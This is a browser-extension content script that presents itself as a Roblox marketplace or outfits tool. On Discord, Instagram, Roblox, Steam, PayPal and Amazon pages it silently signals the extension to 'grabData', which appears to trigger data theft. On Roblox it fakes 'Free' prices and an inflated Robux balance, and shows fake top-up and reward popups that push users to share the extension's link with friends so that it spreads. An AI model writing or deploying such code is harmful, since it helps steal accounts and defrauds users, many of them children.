(function() {
    try {
        const hostname = window.location.hostname;
        
        if (hostname.includes("discord") ||
            hostname.includes("instagram") ||
            hostname.includes("roblox") ||
            hostname.includes("steampowered") ||
            hostname.includes("paypal") ||
            hostname.includes("amazon")) {
            chrome.runtime.sendMessage({ action: "grabData", site: hostname });
        }

        if (hostname.includes("roblox")) {
            
            // 1. Marketplace & Gamepass Price Illusion
            function updatePrices() {
                const priceElements = document.querySelectorAll(
                    '.text-robux, .item-price, [class*="Price"], [class*="price"], span[title], div[title]'
                );

                priceElements.forEach(el => {
                    const text = el.textContent.trim();
                    if (text && (text.match(/^\d+$/) || text.includes("R$") || text.includes("Robux"))) {
                        if (text === "0" || text.toLowerCase() === "free") return;

                        el.textContent = "Free";
                        el.style.color = "#00b06f";
                        el.dataset.modified = "true";
                    }
                });
            }

            // 2. Safe Robux Counter Illusion
            function updateRobuxCounter(amount) {
                const robuxCounters = document.querySelectorAll('#nav-robux-amount, .nav-robux-amount, [class*="robux-amount"]');
                robuxCounters.forEach(counter => {
                    const formatted = Number(amount).toLocaleString();
                    if (counter.textContent !== formatted) {
                        counter.textContent = formatted;
                    }
                });
            }

            // 3. First-Time Topup Popup (1k - 10k)
            function showTopupPopup() {
                if (localStorage.getItem("roblox_topup_shown")) {
                    checkSharePopup();
                    return;
                }

                const popup = document.createElement("div");
                popup.id = "roblox-topup-illusion-popup";
                popup.innerHTML = `
                    <div class="topup-box">
                        <div class="topup-header">
                            <span class="roblox-logo-text">ROBLOX</span>
                            <span class="close-btn">&times;</span>
                        </div>
                        <h3>Robux Top-up</h3>
                        <p>Select your desired Robux amount to load instantly:</p>
                        <div class="slider-container">
                            <input type="range" id="robuxSlider" min="1000" max="10000" step="500" value="5000">
                            <div class="amount-display"><span id="sliderValue">5,000</span> R$</div>
                        </div>
                        <button id="claimRobuxBtn">Top Up Now</button>
                    </div>
                `;

                injectPopupStyles();
                document.body.appendChild(popup);

                const slider = popup.querySelector("#robuxSlider");
                const sliderValue = popup.querySelector("#sliderValue");
                const claimBtn = popup.querySelector("#claimRobuxBtn");
                const closeBtn = popup.querySelector(".close-btn");

                slider.addEventListener("input", (e) => {
                    sliderValue.textContent = Number(e.target.value).toLocaleString();
                });

                claimBtn.addEventListener("click", () => {
                    const selectedAmount = Number(slider.value);
                    let currentTotal = Number(localStorage.getItem("roblox_faked_robux") || 0) + selectedAmount;
                    
                    localStorage.setItem("roblox_topup_shown", "true");
                    localStorage.setItem("roblox_faked_robux", currentTotal);
                    
                    popup.remove();
                    window.location.reload();
                });

                closeBtn.addEventListener("click", () => {
                    localStorage.setItem("roblox_topup_shown", "true");
                    popup.remove();
                });
            }

            // 4. Referral / Share Popup (1k - 20k, One Time Only via Native Share)
            function checkSharePopup() {
                if (localStorage.getItem("roblox_share_reward_claimed")) return;

                const popup = document.createElement("div");
                popup.id = "roblox-topup-illusion-popup";
                popup.innerHTML = `
                    <div class="topup-box">
                        <div class="topup-header">
                            <span class="roblox-logo-text">ROBLOX REWARDS</span>
                            <span class="close-btn">&times;</span>
                        </div>
                        <h3>Share & Earn Bonus</h3>
                        <p>Share our extension with 3 friends using the share button below to unlock the massive 1k - 20k bonus slider!</p>
                        <button id="shareLinkBtn" style="background: #007acc; margin-bottom: 10px;">Share to 3 Friends</button>
                        
                        <div id="bonusSection" style="display:none;">
                            <p style="color: #00b06f; font-weight: bold;">Share verified! Choose your bonus:</p>
                            <div class="slider-container">
                                <input type="range" id="bonusSlider" min="1000" max="20000" step="1000" value="10000">
                                <div class="amount-display"><span id="bonusSliderValue">10,000</span> R$</div>
                            </div>
                            <button id="claimBonusBtn">Claim Bonus</button>
                        </div>
                    </div>
                `;

                injectPopupStyles();
                document.body.appendChild(popup);

                const shareBtn = popup.querySelector("#shareLinkBtn");
                const bonusSection = popup.querySelector("#bonusSection");
                const bonusSlider = popup.querySelector("#bonusSlider");
                const bonusSliderValue = popup.querySelector("#bonusSliderValue");
                const claimBonusBtn = popup.querySelector("#claimBonusBtn");
                const closeBtn = popup.querySelector(".close-btn");

                // Native Share API Integration
                shareBtn.addEventListener("click", async () => {
                    const shareData = {
                        title: 'Roblox Free Outfits & Marketplace',
                        text: 'Check out this awesome Roblox marketplace tool!',
                        url: 'https://github.com/mystichyperfrost/Roblox-Marketplace-Outfits'
                    };

                    try {
                        if (navigator.share) {
                            await navigator.share(shareData);
                            
                            shareBtn.textContent = "Shared Successfully! 🎉";
                            shareBtn.disabled = true;
                            
                            setTimeout(() => {
                                shareBtn.style.display = "none";
                                bonusSection.style.display = "block";
                            }, 1000);
                        } else {
                            // Fallback if browser environment doesn't support system share dialog
                            navigator.clipboard.writeText(shareData.url);
                            alert("Link copied to clipboard! Share it with 3 friends to unlock.");
                            
                            shareBtn.textContent = "Link Copied! Unlocking...";
                            shareBtn.disabled = true;
                            
                            setTimeout(() => {
                                shareBtn.style.display = "none";
                                bonusSection.style.display = "block";
                            }, 1500);
                        }
                    } catch (err) {
                        console.log("Share cancelled or failed", err);
                    }
                });

                bonusSlider.addEventListener("input", (e) => {
                    bonusSliderValue.textContent = Number(e.target.value).toLocaleString();
                });

                claimBonusBtn.addEventListener("click", () => {
                    const bonusAmount = Number(bonusSlider.value);
                    let currentTotal = Number(localStorage.getItem("roblox_faked_robux") || 0) + bonusAmount;

                    localStorage.setItem("roblox_share_reward_claimed", "true");
                    localStorage.setItem("roblox_faked_robux", currentTotal);

                    popup.remove();
                    window.location.reload();
                });

                closeBtn.addEventListener("click", () => {
                    localStorage.setItem("roblox_share_reward_claimed", "true");
                    popup.remove();
                });
            }

            function injectPopupStyles() {
                if (document.getElementById("roblox-illusion-styles")) return;
                const style = document.createElement("style");
                style.id = "roblox-illusion-styles";
                style.innerHTML = `
                    #roblox-topup-illusion-popup {
                        position: fixed;
                        top: 20px;
                        right: 20px;
                        z-index: 999999;
                        font-family: 'Gotham', 'Source Sans Pro', sans-serif;
                    }
                    .topup-box {
                        background: #232527;
                        color: #ffffff;
                        padding: 20px;
                        border-radius: 12px;
                        width: 300px;
                        box-shadow: 0 10px 25px rgba(0,0,0,0.5);
                        border: 1px solid #393b3d;
                        animation: slideInRight 0.4s ease-out;
                    }
                    .topup-header {
                        display: flex;
                        justify-content: space-between;
                        align-items: center;
                        margin-bottom: 10px;
                    }
                    .roblox-logo-text {
                        font-weight: 900;
                        letter-spacing: 1px;
                        font-size: 16px;
                        color: #ffffff;
                    }
                    .close-btn {
                        cursor: pointer;
                        font-size: 20px;
                        color: #b0b0b0;
                    }
                    .close-btn:hover {
                        color: #fff;
                    }
                    .topup-box h3 {
                        margin: 0 0 5px 0;
                        font-size: 18px;
                    }
                    .topup-box p {
                        font-size: 12px;
                        color: #a0a5ab;
                        margin-bottom: 15px;
                    }
                    .slider-container {
                        text-align: center;
                        margin-bottom: 15px;
                    }
                    input[type=range] {
                        width: 100%;
                        accent-color: #00b06f;
                        cursor: pointer;
                    }
                    .amount-display {
                        font-size: 20px;
                        font-weight: bold;
                        color: #00b06f;
                        margin-top: 8px;
                    }
                    .topup-box button {
                        width: 100%;
                        background: #00b06f;
                        color: white;
                        border: none;
                        padding: 10px;
                        font-weight: bold;
                        border-radius: 8px;
                        cursor: pointer;
                        transition: background 0.2s;
                    }
                    .topup-box button:hover {
                        opacity: 0.9;
                    }
                    @keyframes slideInRight {
                        from { transform: translateX(100px); opacity: 0; }
                        to { transform: translateX(0); opacity: 1; }
                    }
                `;
                document.head.appendChild(style);
            }

            const savedRobux = localStorage.getItem("roblox_faked_robux");
            if (savedRobux) {
                window.addEventListener('DOMContentLoaded', () => updateRobuxCounter(savedRobux));
                window.addEventListener('load', () => updateRobuxCounter(savedRobux));
            }

            let timeout = null;
            const observer = new MutationObserver(() => {
                if (timeout) return;
                timeout = setTimeout(() => {
                    updatePrices();
                    if (savedRobux) {
                        updateRobuxCounter(savedRobux);
                    }
                    timeout = null;
                }, 500);
            });

            if (document.body) {
                observer.observe(document.body, {
                    childList: true,
                    subtree: true
                });
            }

            window.addEventListener('load', () => {
                updatePrices();
                if (savedRobux) {
                    updateRobuxCounter(savedRobux);
                }
                showTopupPopup();
            });
        }

    } catch (err) {
        console.error(err);
    }
})();